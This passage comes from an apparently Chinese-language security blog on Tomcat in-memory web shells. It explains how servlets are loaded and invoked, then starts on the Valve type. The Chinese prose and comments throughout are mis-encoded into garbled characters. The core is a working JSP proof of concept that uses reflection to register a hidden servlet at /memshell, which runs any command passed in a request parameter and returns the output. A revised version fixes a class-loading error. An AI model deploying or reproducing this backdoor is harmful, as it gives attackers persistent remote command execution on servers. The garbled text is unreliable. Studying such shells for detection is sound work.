</span></span><span class="line"><span class="cl">        <span class="n">Wrapper</span> <span class="n">wrapper</span> <span class="o">=</span> <span class="o">(</span><span class="n">Wrapper</span><span class="o">)</span> <span class="n">child</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="kt">int</span> <span class="n">loadOnStartup</span> <span class="o">=</span> <span class="n">wrapper</span><span class="o">.</span><span class="na">getLoadOnStartup</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// 1. æ ¹æ®loadOnStartupåˆ¤æ–­è¯¥Wrapperæ˜¯å¦éœ€è¦åœ¨å¯åŠ¨æ—¶è¢«åŠ è½½;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="o">(</span><span class="n">loadOnStartup</span> <span class="o">&lt;</span> <span class="n">0</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">continue</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="n">Integer</span> <span class="n">key</span> <span class="o">=</span> <span class="n">Integer</span><span class="o">.</span><span class="na">valueOf</span><span class="o">(</span><span class="n">loadOnStartup</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">ArrayList</span><span class="o">&lt;</span><span class="n">Wrapper</span><span class="o">&gt;</span> <span class="n">list</span> <span class="o">=</span> <span class="n">map</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">key</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">list</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">list</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ArrayList</span><span class="o">&lt;&gt;();</span>
</span></span><span class="line"><span class="cl">            <span class="n">map</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">key</span><span class="o">,</span> <span class="n">list</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="n">list</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">wrapper</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="o">(</span><span class="n">ArrayList</span><span class="o">&lt;</span><span class="n">Wrapper</span><span class="o">&gt;</span> <span class="n">list</span> <span class="o">:</span> <span class="n">map</span><span class="o">.</span><span class="na">values</span><span class="o">())</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="o">(</span><span class="n">Wrapper</span> <span class="n">wrapper</span> <span class="o">:</span> <span class="n">list</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">try</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="c1">// 2. åˆå§‹åŒ–Wrapperï¼Œæœ€ç»ˆå°†ä¼šè°ƒç”¨servlet.init()æ¥åˆå§‹åŒ–å°è£…çš„Servlet;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="n">wrapper</span><span class="o">.</span><span class="na">load</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">            <span class="o">...</span> <span class="o">..</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></div><h4 id="è°ƒç”¨servlet">è°ƒç”¨Servlet</h4>
<p>ç°åœ¨ï¼ŒTomcatå·²ç»å¯åŠ¨ï¼ŒServletå·²ç»è¢«åŠ è½½äº†ï¼Œæˆ‘ä»¬æœ€åå°±æ¥çœ‹çœ‹Servletæ—¶å¦‚ä½•è¢«è°ƒç”¨çš„ï¼Œç›´æ¥çœ‹è°ƒç”¨æ ˆå§ï¼š <!-- raw HTML omitted --></p>
<p><figure><img src="/ox-hugo/2022-11-01_08-58-22_screenshot.png"
         alt="Figure 7: service()è°ƒç”¨æ ˆ" width="400px"/><figcaption>
            <p><!-- raw HTML omitted -->Figure 7: <!-- raw HTML omitted -->service()è°ƒç”¨æ ˆ</p>
        </figcaption>
</figure>
 <!-- raw HTML omitted --></p>
<p>æˆ‘ä»¬ä¹‹å‰åœ¨Tomcatè°ƒç”¨filterä¸­ä¹Ÿä»‹ç»è¿‡ï¼Œåœ¨æ‰€æœ‰å¯¹åº”çš„Filterç»“æŸ <strong>doFilter</strong> è¿‡æ»¤æ“ä½œä¹‹åå°±ä¼šæ‰§è¡Œservice()æ­£å¼æ¥ç®¡å’Œå¤„ç†è¯·æ±‚ï¼Œç›¸å…³çš„ä»‹ç»å’Œæˆ‘ä»¬åœ¨filteré‚£ä¸€èŠ‚çœ‹åˆ°çš„é‡åˆåº¦å¾ˆé«˜ï¼Œå°±ä¸å¤šèµ˜è¿°äº†ï¼Œç®€å•å›é¡¾ä¸€ä¸‹  <code>internalDoFilter()</code> å§ï¼š <!-- raw HTML omitted --></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">private</span> <span class="kt">void</span> <span class="nf">internalDoFilter</span><span class="o">(</span><span class="n">ServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="n">ServletResponse</span> <span class="n">response</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span><span class="o">,</span> <span class="n">ServletException</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">pos</span> <span class="o">&lt;</span> <span class="k">this</span><span class="o">.</span><span class="na">n</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">ApplicationFilterConfig</span> <span class="n">filterConfig</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">filters</span><span class="o">[</span><span class="k">this</span><span class="o">.</span><span class="na">pos</span><span class="o">++];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="c1">// 1. æ ¹æ®filterConfigæ¥è·å–filterå¯¹è±¡;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">Filter</span> <span class="n">filter</span> <span class="o">=</span> <span class="n">filterConfig</span><span class="o">.</span><span class="na">getFilter</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span><span class="n">Globals</span><span class="o">.</span><span class="na">IS_SECURITY_ENABLED</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="o">...</span> <span class="o">...</span>
</span></span><span class="line"><span class="cl">                    <span class="o">}</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="c1">// 2. è°ƒç”¨filteræœ¬èº«çš„doFilteræ–¹æ³•ï¼Œè¿‡æ»¤æ“ä½œç»“æŸä¹‹åå†ä¼ é€’ç»™ä¸‹ä¸€ä¸ªfilter;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="n">filter</span><span class="o">.</span><span class="na">doFilter</span><span class="o">(</span><span class="n">request</span><span class="o">,</span> <span class="n">response</span><span class="o">,</span> <span class="k">this</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="o">....</span> <span class="o">...</span>
</span></span><span class="line"><span class="cl">                <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="o">...</span> <span class="o">..</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="o">(</span><span class="n">request</span> <span class="k">instanceof</span> <span class="n">HttpServletRequest</span> <span class="o">&amp;&amp;</span> <span class="n">response</span> <span class="k">instanceof</span> <span class="n">HttpServletResponse</span> <span class="o">&amp;&amp;</span> <span class="n">Globals</span><span class="o">.</span><span class="na">IS_SECURITY_ENABLED</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                    <span class="o">...</span> <span class="o">..</span>
</span></span><span class="line"><span class="cl">                        <span class="o">}</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="c1">// 3. æ‰€æœ‰çš„filteréƒ½doFilteræ“ä½œä¹‹åï¼Œå°±ä¼šæ‰§è¡Œå¯¹åº”çš„servletçš„service()æ–¹æ³•æ­£å¼æ¥ç®¡å¤„ç†request;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="k">this</span><span class="o">.</span><span class="na">servlet</span><span class="o">.</span><span class="na">service</span><span class="o">(</span><span class="n">request</span><span class="o">,</span> <span class="n">response</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></div><p>è‡³æ­¤æˆ‘ä»¬å·²ç»äº†è§£äº†Servletæ˜¯å¦‚ä½•è¢«å¼€å‘ï¼Œæ³¨å†Œï¼›åœ¨Tomcatå¯åŠ¨ä¹‹åæ˜¯å¦‚ä½•è¢«åŠ è½½å’Œè°ƒç”¨çš„äº†ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å°±å¯ä»¥è‡ªå·±æƒ³åŠæ³•åŠ¨æ€åœ°æ³¨å†Œå†…å­˜é©¬äº†ã€‚ <!-- raw HTML omitted --></p>
<h3 id="servletå†…å­˜é©¬">Servletå†…å­˜é©¬</h3>
<p>æ ¹æ®ä¸Šä¸€èŠ‚çš„å†…å®¹ï¼Œæˆ‘ä»¬å¯ä»¥ç½—åˆ—ä¸€ä¸‹ï¼Œæ³¨å†Œä¸€ä¸ªå¯ä»¥è¢«Tomcatç”¨æ¥è°ƒç”¨çš„servletéœ€è¦ä»¥ä¸‹æ­¥éª¤ï¼š <!-- raw HTML omitted --></p>
<ol>
<li>
<p>è‡ªå®šä¹‰ä¸€ä¸ªServletç±»ï¼Œç»§æ‰¿Servletï¼Œå®ç°serviceæ–¹æ³•æ¥åŠ å…¥æˆ‘ä»¬æƒ³è¦æ‰§è¡Œçš„ä»£ç ï¼› <!-- raw HTML omitted --></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="o">&lt;%!</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">class</span> <span class="nc">MemShellServlet</span> <span class="kd">implements</span> <span class="n">Servlet</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="nd">@Override</span>
</span></span><span class="line"><span class="cl">        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">init</span><span class="o">(</span><span class="n">ServletConfig</span> <span class="n">config</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">ServletException</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nd">@Override</span>
</span></span><span class="line"><span class="cl">        <span class="kd">public</span> <span class="n">ServletConfig</span> <span class="nf">getServletConfig</span><span class="o">()</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nd">@Override</span>
</span></span><span class="line"><span class="cl">        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">service</span><span class="o">(</span><span class="n">ServletRequest</span> <span class="n">req</span><span class="o">,</span> <span class="n">jakarta</span><span class="o">.</span><span class="na">servlet</span><span class="o">.</span><span class="na">ServletResponse</span> <span class="n">res</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">ServletException</span><span class="o">,</span> <span class="n">IOException</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">String</span> <span class="n">cmd</span> <span class="o">=</span> <span class="n">req</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">&#34;servlet&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span><span class="n">cmd</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">InputStream</span> <span class="n">in</span> <span class="o">=</span> <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="n">cmd</span><span class="o">).</span><span class="na">getInputStream</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">                <span class="n">Scanner</span> <span class="n">s</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Scanner</span><span class="o">(</span><span class="n">in</span><span class="o">).</span><span class="na">useDelimiter</span><span class="o">(</span><span class="s">&#34;\\A&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">String</span> <span class="n">output</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="na">hasNext</span><span class="o">()</span> <span class="o">?</span> <span class="n">s</span><span class="o">.</span><span class="na">next</span><span class="o">()</span> <span class="o">:</span> <span class="s">&#34;&#34;</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">                <span class="n">res</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">write</span><span class="o">(</span><span class="n">output</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nd">@Override</span>
</span></span><span class="line"><span class="cl">        <span class="kd">public</span> <span class="n">String</span> <span class="nf">getServletInfo</span><span class="o">()</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nd">@Override</span>
</span></span><span class="line"><span class="cl">        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">destroy</span><span class="o">()</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">%&gt;</span>
</span></span></code></pre></div></li>
<li>
<p>åˆ›å»ºä¸€ä¸ªStandardContextå¯¹è±¡ï¼› <!-- raw HTML omitted --></p>
</li>
<li>
<p>åˆ›å»ºä¸€ä¸ªWrapperå¯¹è±¡: <!-- raw HTML omitted --></p>
<ul>
<li><strong>wrapper.setName</strong> è®¾ç½®wrapperçš„åå­—; <!-- raw HTML omitted --></li>
<li><strong>wrapper.setServletClass</strong> è®¾ç½®wrapperä¸­å°è£…çš„Servletçš„ç±»å <!-- raw HTML omitted --></li>
</ul>
</li>
<li>
<p>å°†Wrapperå¯¹è±¡åŠ å…¥StandardContext: <!-- raw HTML omitted --></p>
<ul>
<li>StandardContext#addChild() å°†Wrapperå¯¹è±¡åŠ å…¥StandardContextå¯¹è±¡çš„children mapä¸­; <!-- raw HTML omitted --></li>
<li>StandardContext#addServletMappingDecoded() æ·»åŠ servlet mappingä¿¡æ¯; <!-- raw HTML omitted --></li>
</ul>
</li>
</ol>
<!-- raw HTML omitted -->
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="o">&lt;%</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// 1. åˆ›å»ºä¸€ä¸ªStandardContextå¯¹è±¡ï¼›
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">Field</span> <span class="n">requestField</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;request&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">requestField</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">Request</span> <span class="n">req</span> <span class="o">=</span> <span class="o">(</span><span class="n">Request</span><span class="o">)</span> <span class="n">requestField</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">request</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">StandardContext</span> <span class="n">context</span> <span class="o">=</span> <span class="o">(</span><span class="n">StandardContext</span><span class="o">)</span> <span class="n">req</span><span class="o">.</span><span class="na">getContext</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// 2. åˆ›å»ºä¸€ä¸ªStandardWrapperå¯¹è±¡ï¼›
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">MemShellServlet</span> <span class="n">memShellServlet</span> <span class="o">=</span> <span class="k">new</span> <span class="n">MemShellServlet</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">    <span class="n">StandardWrapper</span> <span class="n">standardWrapper</span> <span class="o">=</span> <span class="k">new</span> <span class="n">StandardWrapper</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">    <span class="n">String</span> <span class="n">servlet_name</span> <span class="o">=</span> <span class="n">memShellServlet</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getSimpleName</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">    <span class="n">standardWrapper</span><span class="o">.</span><span class="na">setName</span><span class="o">(</span><span class="n">servlet_name</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">standardWrapper</span><span class="o">.</span><span class="na">setServletClass</span><span class="o">(</span><span class="n">MemShellServlet</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// 3. å°†StandardWrapperåŠ å…¥StandardContextä¸­ï¼›
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">context</span><span class="o">.</span><span class="na">addChild</span><span class="o">(</span><span class="n">standardWrapper</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">context</span><span class="o">.</span><span class="na">addServletMappingDecoded</span><span class="o">(</span><span class="s">&#34;/memshell&#34;</span><span class="o">,</span> <span class="n">servlet_name</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">%&gt;</span>
</span></span></code></pre></div><p>æ¥ç€æˆ‘ä»¬å…ˆè®¿é—®jspæ–‡ä»¶æ¥åŠ¨æ€Servletï¼Œç„¶åå†è®¿é—®å¹¶é™„åŠ ä¸Šæƒ³è¦æ‰§è¡Œçš„å‘½ä»¤å°±å¯ä»¥äº†ï¼š <!-- raw HTML omitted --></p>
<p><figure><img src="/ox-hugo/2022-11-02_16-07-07_screenshot.png"
         alt="Figure 8: ClassNotFoundExceptionå¼‚å¸¸" width="700px"/><figcaption>
            <p><!-- raw HTML omitted -->Figure 8: <!-- raw HTML omitted -->ClassNotFoundExceptionå¼‚å¸¸</p>
        </figcaption>
</figure>
 <!-- raw HTML omitted --></p>
<p>å‡ºç°äº†ClassNotFoundExceptionå¼‚å¸¸ï¼Ÿæˆ‘ä»¬æ¥çœ‹è°ƒç”¨æ ˆï¼Œæœ€åä¸€ä¸ªæ–¹æ³•æ˜¯ <code>loadClass()</code>, è¿™æ˜¯åœ¨åå°„å¾—åˆ°è‡ªå®šä¹‰Servletç±»æ—¶å‘ç”Ÿäº†é”™è¯¯ï¼ŒåŸå› ä¹Ÿå¾ˆç®€å•ï¼Œå°±æ˜¯æˆ‘ä»¬æƒ³è¦åŠ è½½çš„ç±»æ˜¯ <strong>org.apache.jsp.MemShellServlet_jsp$MemShellServlet</strong>, è¿™æ˜¯ä¸€ä¸ªä½¿ç”¨ <code>&lt;%!</code> æ ‡ç­¾å®šä¹‰åœ¨JSPæ–‡ä»¶å†…éƒ¨çš„ç±»ï¼Œæ— æ³•è¢«å¤–éƒ¨æ‰€è®¿é—®ï¼Œæ‰å¯¼è‡´äº†åå°„å¼‚å¸¸ã€‚ <!-- raw HTML omitted --></p>
<p>å› æ­¤ï¼Œæˆ‘ä»¬åªéœ€è¦æ‰‹åŠ¨ä¸ºstandardWrapperæ·»åŠ ä¸Šservletå®ä¾‹å³å¯ï¼Œè¿™æ ·å°±å¯ä»¥ç»•è¿‡åå°„è¿™ä¸ªæ­¥éª¤ï¼Œæ„Ÿå…´è¶£çš„è¯»è€…å¯ä»¥å»ç ”ç©¶ä¸€ä¸‹  <code>StandardWrapper#allocate</code> æ–¹æ³•ï¼Œè¿™é‡Œå°±ä¸æ·±å…¥äº†ã€‚ <!-- raw HTML omitted --></p>
<p>ä¿®æ”¹çš„POCå¦‚ä¸‹ï¼š <!-- raw HTML omitted --></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="o">&lt;%</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// 1. åˆ›å»ºä¸€ä¸ªStandardContextå¯¹è±¡ï¼›
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">Field</span> <span class="n">requestField</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;request&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">requestField</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">Request</span> <span class="n">req</span> <span class="o">=</span> <span class="o">(</span><span class="n">Request</span><span class="o">)</span> <span class="n">requestField</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">request</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">StandardContext</span> <span class="n">context</span> <span class="o">=</span> <span class="o">(</span><span class="n">StandardContext</span><span class="o">)</span> <span class="n">req</span><span class="o">.</span><span class="na">getContext</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// 2. åˆ›å»ºä¸€ä¸ªStandardWrapperå¯¹è±¡ï¼›
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">MemShellServlet</span> <span class="n">memShellServlet</span> <span class="o">=</span> <span class="k">new</span> <span class="n">MemShellServlet</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">    <span class="n">StandardWrapper</span> <span class="n">standardWrapper</span> <span class="o">=</span> <span class="k">new</span> <span class="n">StandardWrapper</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">    <span class="n">String</span> <span class="n">servlet_name</span> <span class="o">=</span> <span class="n">memShellServlet</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getSimpleName</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">    <span class="n">standardWrapper</span><span class="o">.</span><span class="na">setName</span><span class="o">(</span><span class="n">servlet_name</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">standardWrapper</span><span class="o">.</span><span class="na">setServlet</span><span class="o">(</span><span class="n">memShellServlet</span><span class="o">);</span>    <span class="c1">// ç»•è¿‡åå°„ç”ŸæˆServletå®ä¾‹çš„æ­¥éª¤
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">standardWrapper</span><span class="o">.</span><span class="na">setServletClass</span><span class="o">(</span><span class="n">memShellServlet</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">toString</span><span class="o">());</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// 3. å°†StandardWrapperåŠ å…¥StandardContextä¸­ï¼›
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">context</span><span class="o">.</span><span class="na">addChild</span><span class="o">(</span><span class="n">standardWrapper</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">context</span><span class="o">.</span><span class="na">addServletMappingDecoded</span><span class="o">(</span><span class="s">&#34;/memshell&#34;</span><span class="o">,</span> <span class="n">servlet_name</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">%&gt;</span>
</span></span></code></pre></div><p>æœ€åå…ˆè®¿é—®MemShellServlet.jspæ³¨å†ŒServletï¼Œæ¥ç€è®¿é—®éªŒè¯ï¼š <!-- raw HTML omitted --></p>
<p><figure><img src="/ox-hugo/2022-11-02_16-47-57_screenshot.png"
         alt="Figure 9: Servletå†…å­˜é©¬æ³¨å…¥æˆåŠŸ" width="500px"/><figcaption>
            <p><!-- raw HTML omitted -->Figure 9: <!-- raw HTML omitted -->Servletå†…å­˜é©¬æ³¨å…¥æˆåŠŸ</p>
        </figcaption>
</figure>
 <!-- raw HTML omitted --></p>
<h2 id="valveå‹">Valveå‹</h2>
<p>ç»ˆäºæ¥åˆ°æœ¬æ–‡è¦ä»‹ç»çš„æœ€ç»ˆä¸€ç§Tomcatå†…å­˜é©¬ç±»å‹äº†ï¼Œå…³äºValveå‹å†…å­˜é©¬çš„åˆ©ç”¨æ¯”è¾ƒç®€å•ï¼Œæˆ‘ä»¬å°±ç¨å¾®å›é¡¾è¡¥å……ä¸€ç‚¹æœ‰å…³Tomcatçš„ <strong>Pipeline-Valve</strong> è´£ä»»é“¾çš„å†…å®¹ï¼Œä¸»è¦ä¹Ÿæ˜¯çœ‹åˆ°ä¸€äº›æ–‡ç« ä¸­å‡ºç°äº†è°¬è¯¯æƒ³è¦å†æ¬¡çº æ­£ï¼› <!-- raw HTML omitted --></p>
<h4 id="pipeline-valve-ç®¡é“-é˜€é—¨è´£ä»»é“¾ç®€ä»‹">Pipeline-Valve ç®¡é“-é˜€é—¨è´£ä»»é“¾ç®€ä»‹</h4>
<p>æˆ‘ä»¬çœ‹å›¾è¯´è¯ï¼Œä¸‹é¢çš„å›¾ä¾‹å±•ç¤ºäº†Tomcatå¯¹äºä¸€æ¬¡æ¥è‡ªå®¢æˆ·ç«¯çš„HTTPè¯·æ±‚çš„å¤„ç†ï¼Œç”±Connectorè¿æ¥å™¨å°è£…æˆRequestä»¥åŠResponseå¯¹è±¡åäº¤ç”±Containerçš„å››ç§å®¹å™¨è¿›è¡Œå¤„ç†ï¼› <!-- raw HTML omitted --></p>
<p>Containeré‡‡ç”¨äº† <code>Pipleline-Valve è´£ä»»é“¾</code> æœºåˆ¶ï¼Œå³ï¼š <!-- raw HTML omitted --></p>
<ol>
<li>
<p>æ¯ä¸€ä¸ªå®¹å™¨å¯¹è±¡ï¼Œä»Engineåˆ°Wrapperï¼Œéƒ½ <code>ç‹¬ç«‹</code> ç»´æŠ¤ä¸€ä¸ªPiplelineå¯¹è±¡ï¼ˆè€Œä¸æ˜¯å¾ˆå¤šæ–‡ç« å£è€³ç›¸ä¼ çš„å…±åŒç»´æŠ¤ä¸€ä¸ªå¯¹è±¡ï¼‰ï¼Œå…¶ä¸­åŒ…å«è‹¥å¹²çš„Valveå¯¹è±¡ï¼Œè¿™äº›Valveæ˜¯ç”¨æ¥è¡¨ç¤ºè¯¥å®¹å™¨å¯¹äºè¯·æ±‚æ‰€è¿›è¡Œçš„ä¸€ç³»åˆ—å¤„ç†ï¼› <!-- raw HTML omitted --></p>
<p><figure><img src="/ox-hugo/2022-11-02_08-51-50_screenshot.png"
             alt="Figure 10: StandardContextä¸­çš„pipeline" width="700px"/><figcaption>
                <p><!-- raw HTML omitted -->Figure 10: <!-- raw HTML omitted -->StandardContextä¸­çš„pipeline</p>
            </figcaption>
    </figure>
 <!-- raw HTML omitted --></p>
<p><figure><img src="/ox-hugo/2022-11-02_08-52-49_screenshot.png"
             alt="Figure 11: StandardWrapperä¸­çš„pipeline" width="700px"/><figcaption>
                <p><!-- raw HTML omitted -->Figure 11: <!-- raw HTML omitted -->StandardWrapperä¸­çš„pipeline</p>
            </figcaption>
    </figure>
 <!-- raw HTML omitted --></p>
</li>
<li>
<p>æ¯ä¸€ä¸ªå®¹å™¨ç»“æŸå¤„ç†ä¹‹åï¼Œå°±ä¼šè·å–ç›¸åº”çš„å­å®¹å™¨ï¼Œå¹¶å¼€å§‹æ‰§è¡Œå…¶å­å®¹å™¨çš„pipelineä¸­çš„valveæ¥å¯¹è¯·æ±‚è¿›è¡Œè¿›ä¸€æ­¥å¤„ç†ï¼› <!-- raw HTML omitted --></p>
</li>
</ol>
<p><figure><img src="/ox-hugo/2022-10-24_21-12-28_screenshot.png"
         alt="Figure 12: Pipleline-Valveè´£ä»»é“¾" width="700px"/><figcaption>
            <p><!-- raw HTML omitted -->Figure 12: <!-- raw HTML omitted -->Pipleline-Valveè´£ä»»é“¾</p>
        </figcaption>
</figure>
 <!-- raw HTML omitted --></p>
